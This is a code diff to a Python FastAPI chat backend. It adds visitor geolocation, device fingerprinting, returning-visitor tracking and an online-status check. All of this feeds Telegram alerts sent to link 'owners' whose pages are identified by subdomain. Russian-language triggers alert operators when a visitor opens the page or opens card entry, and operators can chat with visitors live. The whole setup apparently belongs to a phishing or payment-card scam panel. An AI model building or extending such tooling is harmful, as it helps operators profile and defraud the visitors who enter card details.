@@ -7,6 +7,7 @@ import httpx
 from fastapi import APIRouter, Request
 from fastapi.responses import JSONResponse, StreamingResponse
 from pydantic import BaseModel
+from user_agents import parse as ua_parse
 
 from api.cache import (
     append_chat_message,
@@ -19,6 +20,7 @@ from api.cache import (
 )
 from db.crud.links import get_link_by_subdomain_and_id
 from db.crud.users import get_or_create_user
+from db.crud.visitors import get_or_create_visitor
 from db.models import User
 from db.session import get_session
 
@@ -28,6 +30,42 @@ router = APIRouter(prefix="/chat")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 NOTIFY_CHAT_ID = os.getenv("NOTIFY_CHAT_ID", "")
 ADMIN_ID = os.getenv("ADMIN_ID", "")
+
+
+# ── geo lookup ────────────────────────────────────────────────────────────────
+
+async def _get_geo(ip: str) -> tuple[str, str]:
+    """Returns (city, country). Falls back to ('?', '?') on any error."""
+    try:
+        async with httpx.AsyncClient(timeout=4) as client:
+            r = await client.get(f"http://ip-api.com/json/{ip}?fields=city,country,status")
+            if r.status_code == 200:
+                data = r.json()
+                if data.get("status") == "success":
+                    return data.get("city", "?"), data.get("country", "?")
+    except Exception:
+        pass
+    return "?", "?"
+
+
+def _parse_device(user_agent: str) -> str:
+    """Returns a short device/OS string like 'Chrome 124 / Windows 10'."""
+    if not user_agent:
+        return "?"
+    try:
+        ua = ua_parse(user_agent)
+        browser = ua.browser.family
+        browser_ver = ua.browser.version_string.split(".")[0]
+        os_name = ua.os.family
+        os_ver = ua.os.version_string.split(".")[0]
+        parts = []
+        if browser and browser != "Other":
+            parts.append(f"{browser} {browser_ver}".strip())
+        if os_name and os_name != "Other":
+            parts.append(f"{os_name} {os_ver}".strip())
+        return " / ".join(parts) or "?"
+    except Exception:
+        return "?"
 
 
 # ── translation ───────────────────────────────────────────────────────────────
@@ -63,6 +101,8 @@ class StartSession(BaseModel):
     subdomain: str
     link_id: str
     lang: str = "ru"
+    user_agent: str = ""
+    sys_lang: str = ""
 
 
 class VisitorMessage(BaseModel):
@@ -111,10 +151,29 @@ async def _send_telegram(chat_id: str | int, text: str,
 # ── POST /chat/session ────────────────────────────────────────────────────────
 
 @router.post("/session")
-async def start_session(body: StartSession) -> JSONResponse:
+async def start_session(body: StartSession, request: Request) -> JSONResponse:
+    ip = (
+        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
+        or (request.client.host if request.client else "?")
+    )
+    city, country = await _get_geo(ip)
+    device = _parse_device(body.user_agent or request.headers.get("User-Agent", ""))
+    sys_lang = body.sys_lang or body.lang
+
+    async with get_session() as db:
+        visitor, is_new = await get_or_create_visitor(
+            db, ip=ip, city=city, country=country,
+            device=device, sys_lang=sys_lang,
+        )
+        visitor_id = visitor.id
+
     session_id = secrets.token_urlsafe(16)
-    await create_chat_session(session_id, body.subdomain, body.link_id, lang=body.lang)
-    return JSONResponse({"session_id": session_id})
+    await create_chat_session(
+        session_id, body.subdomain, body.link_id,
+        lang=body.lang, visitor_id=visitor_id,
+        city=city, country=country, device=device, sys_lang=sys_lang,
+    )
+    return JSONResponse({"session_id": session_id, "visitor_id": visitor_id, "is_new": is_new})
 
 
 # ── GET /chat/steps ───────────────────────────────────────────────────────────
@@ -167,6 +226,16 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         or (request.client.host if request.client else "?")
     )
 
+    sess_data = sess or {}
+    visitor_id  = sess_data.get("visitor_id", "?")
+    city        = sess_data.get("city", "?")
+    country     = sess_data.get("country", "?")
+    device      = sess_data.get("device", "?")
+    sys_lang    = sess_data.get("sys_lang", visitor_lang)
+
+    # format city/country
+    geo_str = ", ".join(filter(lambda x: x and x != "?", [city, country])) or "?"
+
     trigger_label = {
         "open": "📂 открыл страницу",
         "card": "💳 открыл ввод карты",
@@ -175,10 +244,18 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         "user": "✍️ написал сообщение",
     }.get(body.trigger or "user", "✍️ написал сообщение")
 
+    is_new_marker = ""
+    if sess_data.get("visitor_id"):
+        # first message in this session is always trigger=open; mark new vs returning
+        msgs_count = len(sess_data.get("msgs", []))
+        is_new_marker = "🆕 Новый клиент" if msgs_count <= 1 else "🔄 Повторный клиент"
+
     header = (
-        f"💬 <b>Чат со страницы</b> [{trigger_label}]\n"
-        f"🔗 {body.subdomain}/{body.link_id} | 👤 {owner_label} | 🌐 {ip}\n"
-        f"🗨 Сессия: <code>{body.session_id}</code>\n"
+        f"{is_new_marker} <b>#{visitor_id}</b> [{trigger_label}]\n"
+        f"🔗 {body.subdomain}/{body.link_id}\n"
+        f"🌍 {geo_str}\n"
+        f"📱 {device}\n"
+        f"🗣 {sys_lang}\n"
     )
     if visitor_lang != "ru" and ru_text != body.text:
         msg_body = f"<i>[{visitor_lang}→ru]</i> {ru_text}"
@@ -186,10 +263,16 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
 
     reply_kb = {
-        "inline_keyboard": [[{
-            "text": "↩️ Ответить",
-            "callback_data": f"wchat_reply:{body.session_id}:{visitor_lang}"
-        }]]
+        "inline_keyboard": [[
+            {
+                "text": "💬 Сообщение",
+                "callback_data": f"wchat_reply:{body.session_id}:{visitor_lang}"
+            },
+            {
+                "text": "🟢 Проверить онлайн",
+                "callback_data": f"wchat_online:{body.session_id}"
+            },
+        ]]
     }
 
     # owner of the link gets the notification; fall back to global admin
@@ -229,3 +312,12 @@ async def chat_stream(session_id: str):
             "X-Accel-Buffering": "no",
         },
     )
+
+
+# ── GET /chat/online/{session_id} ─────────────────────────────────────────────
+
+@router.get("/online/{session_id}")
+async def check_online(session_id: str) -> JSONResponse:
+    """Returns whether the visitor's session is still alive in Redis."""
+    sess = await get_chat_session(session_id)
+    return JSONResponse({"online": sess is not None})
